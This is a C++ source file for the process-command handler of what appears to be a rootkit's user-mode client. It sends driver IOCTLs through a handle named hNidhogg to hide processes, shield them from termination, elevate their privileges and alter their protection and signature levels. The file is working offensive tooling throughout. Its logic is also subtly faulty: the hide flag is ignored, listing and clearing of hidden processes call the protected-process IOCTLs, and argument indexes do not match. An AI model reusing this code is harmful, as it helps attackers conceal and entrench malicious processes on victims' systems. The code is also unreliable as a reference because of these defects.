#include "pch.h"
#include "ProcessHandler.h"

/*
* Description:
* HandleCommand is responsible for handling a process related command.
*
* Parameters:
* @command [_In_ std::string] -- The command to be handled.
*
* Returns:
* There is no return value.
*/
void ProcessHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (commandName.compare("add") == 0 || commandName.compare("protect") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
		Protect(pid, true) ? std::cout << "Process " << pid << " protected" << std::endl :
			std::cerr << "Failed to protect process " << pid << std::endl;
	}
	else if (commandName.compare("remove") == 0 || commandName.compare("unprotect") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Protect(pid, false) ? std::cout << "Removed protection for process " << pid << std::endl :
			std::cerr << "Failed to remove protection for process " << pid << std::endl;
	}
	else if (commandName.compare("hide") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Hide(pid, true) ? std::cout << "Process " << pid << " is now hidden" << std::endl :
			std::cerr << "Failed to hide process " << pid << std::endl;
	}
	else if (commandName.compare("unhide") == 0 || commandName.compare("restore") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Hide(pid, false) ? std::cout << "Process " << pid << " is now revealed" << std::endl :
			std::cerr << "Failed to reveal process " << pid << std::endl;
	}
	else if (commandName.compare("elevate") == 0) {
		if (!CheckInput(params)) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		Elevate(pid) ? std::cout << "Process " << pid << " elevated" << std::endl :
			std::cerr << "Failed to elevate process " << pid << std::endl;
	}
	else if (commandName.compare("list") == 0) {
		if (params.size() != 2) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		std::string processType = params.at(1);

		if (processType.compare("hidden") == 0) {
			std::vector<DWORD> result = ListHiddenProcesses();

			std::cout << "[+] Hidden processes:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}
		}
		else if (processType.compare("protected") == 0) {
			std::vector<DWORD> result = ListProtectedProcesses();

			std::cout << "[+] Protected processes:" << std::endl;

			for (int i = 0; i < result.size(); i++) {
				std::cout << "\t" << result[i] << std::endl;
			}
		}
		else {
			std::cerr << "Invalid option!" << std::endl;
			PrintHelp();
		}
	}
	else if (commandName.compare("set_protection") == 0) {
		if (params.size() != 4) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
		UCHAR signerType = static_cast<UCHAR>(atoi(params.at(2).c_str()));
		UCHAR signatureSigner = static_cast<UCHAR>(atoi(params.at(3).c_str()));

		if ((signerType < PsProtectedTypeNone || signerType > PsProtectedTypeProtected) ||
			(signatureSigner < PsProtectedSignerNone || signatureSigner > PsProtectedSignerMax)) {
			std::cerr << "Invalid signer type or signature signer" << std::endl;
			PrintHelp();
			return;
		}

		SetProtection(pid, signerType, signatureSigner) ? std::cout << "Process " << pid << " signature level changed (type: " 
			<< signerType << ", signer: " << signatureSigner << ")" << std::endl :
			std::cerr << "Failed to change process " << pid << " signature level" << std::endl;
	}
	else if (commandName.compare("clear") == 0) {
		if (params.size() != 2) {
			std::cerr << "Invalid usage" << std::endl;
			PrintHelp();
			return;
		}

		std::string processType = params.at(0);

		if (processType.compare("all") == 0) {
			ClearAll() ? std::cout << "All processes cleared" << std::endl :
				std::cerr << "Failed to clear all processes" << std::endl;
		}
		else if (processType.compare("hidden") == 0) {
			ClearHiddenProcesses() ? std::cout << "Hidden processes cleared" << std::endl :
				std::cerr << "Failed to clear hidden processes" << std::endl;
		}
		else if (processType.compare("protected") == 0) {
			ClearProtectedProcesses() ? std::cout << "Protected processes cleared" << std::endl :
				std::cerr << "Failed to clear protected processes" << std::endl;
		}
		else {
			std::cerr << "Invalid option!" << std::endl;
			PrintHelp();
		}
	}
	else {
		std::cerr << "Invalid option!" << std::endl;
		PrintHelp();
	}
}

/*
* Description:
* CheckInput is responsible for checking the input parameters for the process commands.
* 
* Parameters:
* @params [_In_ const std::vector<std::string>&] -- The input parameters to be checked.
* 
* Returns:
* @bool											 -- Whether the input parameters are valid or not.
*/
bool ProcessHandler::CheckInput(_In_ const std::vector<std::string>& params) {
	if (params.size() != 2) {
		std::cerr << "Invalid usage" << std::endl;
		return false;
	}
	return IsValidPid(params.at(1));
}

/*
* Description:
* IsValidPid is responsible for checking if the given raw PID is valid.
* 
* Parameters:
* @rawPid [_In_ std::string] -- The raw PID to be checked.
* 
* Returns:
* @bool					-- Whether the PID is valid or not.
*/
bool ProcessHandler::IsValidPid(_In_ std::string rawPid) {
	if (rawPid.empty() || !std::all_of(rawPid.begin(), rawPid.end(), ::isdigit)) {
		std::cerr << "Invalid PID" << std::endl;
		return false;
	}
	DWORD pid = static_cast<DWORD>(atoi(rawPid.c_str()));

	if (pid < SYSTEM_PID || pid > MAXDWORD) {
		std::cerr << "PID must be greater than 4 and smaller than max DWORD" << std::endl;
		return false;
	}
	return true;
}

/*
* Description:
* Protect is responsible for issuing a IOCTL_PROTECT_UNPROTECT_PROCESS to protect or unprotect a process.
*
* Parameters:
* @pid	   [_In_ DWORD] -- The process id to be protected or unprotected.
* @protect [_In_ bool]  -- Whether to protect or unprotect the process.
*
* Returns:
* @bool					-- Whether the operation was successful or not.
*/
bool ProcessHandler::Protect(_In_ DWORD pid, _In_ bool protect) {
	DWORD returned;
	ProtectedProcess protectedProcess = { pid, protect };

	return DeviceIoControl(this->hNidhogg.get(), IOCTL_PROTECT_UNPROTECT_PROCESS, &protectedProcess, sizeof(protectedProcess),
		nullptr, 0, &returned, nullptr);
}

/*
* Description:
* Hide is responsible for issuing a IOCTL_HIDE_UNHIDE_PROCESS to hide or unhide a process.
*
* Parameters:
* @pid	[_In_ DWORD] -- The process id to be hidden or unhidden.
* @hide [_In_ bool]  -- Whether to hide or unhide the process.
*
* Returns:
* @bool				 -- Whether the operation was successful or not.
*/
bool ProcessHandler::Hide(_In_ DWORD pid, _In_ bool hide) {
	DWORD returned;
	HiddenProcess hiddenProcess = { pid, true };

	return DeviceIoControl(this->hNidhogg.get(), IOCTL_HIDE_UNHIDE_PROCESS, &hiddenProcess, sizeof(hiddenProcess), nullptr, 0,
		&returned, nullptr);
}

/*
* Description:
* Elevate is responsible for issuing a IOCTL_ELEVATE_PROCESS to elevate a process.
*
* Parameters:
* @pid [_In_ DWORD] -- The process id to be elevated.
*
* Returns:
* @bool				-- Whether the operation was successful or not.
*/
bool ProcessHandler::Elevate(_In_ DWORD pid) {
	DWORD returned;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_ELEVATE_PROCESS, &pid, sizeof(pid), nullptr, 0, &returned, nullptr);
}

/*
* Description:
* SetProtection is responsible for issuing a IOCTL_SET_PROCESS_SIGNATURE_LEVEL to change the process' signature level.
*
* Parameters:
* @pid			   [_In_ DWORD] -- The process id to be changed.
* @signerType	   [_In_ UCHAR] -- The signer type to be set.
* @signatureSigner [_In_ UCHAR] -- The signature signer to be set.
*
* Returns:
* @bool						    -- Whether the operation was successful or not.
*/
bool ProcessHandler::SetProtection(_In_ DWORD pid, _In_ UCHAR signerType, _In_ UCHAR signatureSigner) {
	DWORD returned;
	ProcessSignature processSignature{};

	processSignature.Pid = pid;
	processSignature.SignerType = signerType;
	processSignature.SignatureSigner = signatureSigner;

	return DeviceIoControl(this->hNidhogg.get(), IOCTL_SET_PROCESS_SIGNATURE_LEVEL, &processSignature, sizeof(processSignature),
		nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ClearAll is responsible for issuing a IOCTL_CLEAR_PROCESSES to clear all processes.
*
* Parameters:
* There are no parameters
*
* Returns:
* @bool						    -- Whether the operation was successful or not.
*/
bool ProcessHandler::ClearAll() {
	DWORD returned;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESS_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ClearProtectedProcesses is responsible for issuing a IOCTL_CLEAR_PROTECTED_PROCESS to clear all protected processes.
*
* Parameters:
* There are no parameters
*
* Returns:
* @bool						    -- Whether the operation was successful or not.
*/
bool ProcessHandler::ClearProtectedProcesses() {
	DWORD returned;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESS_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr);
}

/*
* Description:
* ClearHiddenProcesses is responsible for issuing a IOCTL_CLEAR_HIDDEN_PROCESSES to clear all hidden processes.
*
* Parameters:
* There are no parameters
*
* Returns:
* @bool						    -- Whether the operation was successful or not.
*/
bool ProcessHandler::ClearHiddenProcesses() {
	DWORD returned;
	return DeviceIoControl(this->hNidhogg.get(), IOCTL_CLEAR_PROCESS_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr);
}


/*
* Description:
* ListProtectedProcesses is responsible for issuing a IOCTL_QUERY_PROTECTED_PROCESSES to get all protected processes.
*
* Parameters:
* There are no parameters
*
* Returns:
* @pids [std::vector<DWORD>] -- Protected PIDS.
*/
std::vector<DWORD> ProcessHandler::ListProtectedProcesses() {
	DWORD returned;
	OutputProtectedProcessesList result{};
	std::vector<DWORD> pids{};

	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_QUERY_PROTECTED_PROCESSES, nullptr, 0, &result, sizeof(result), &returned,
		nullptr)) {
		return pids;
	}

	for (ULONG i = 0; i < result.PidsCount; i++)
		pids.push_back(result.Processes[i]);
	return pids;
}

/*
* Description:
* ListHiddenProcesses is responsible for issuing a IOCTL_QUERY_HIDDEN_PROCESSES to get all hidden processes.
*
* Parameters:
* There are no parameters
*
* Returns:
* @pids [std::vector<DWORD>] -- Hidden PIDS.
*/
std::vector<DWORD> ProcessHandler::ListHiddenProcesses() {
	DWORD returned;
	OutputProtectedProcessesList result{};
	std::vector<DWORD> pids{};

	if (!DeviceIoControl(this->hNidhogg.get(), IOCTL_QUERY_PROTECTED_PROCESSES, nullptr, 0, &result, sizeof(result), &returned,
		nullptr)) {
		return pids;
	}

	for (ULONG i = 0; i < result.PidsCount; i++)
		pids.push_back(result.Processes[i]);
	return pids;
}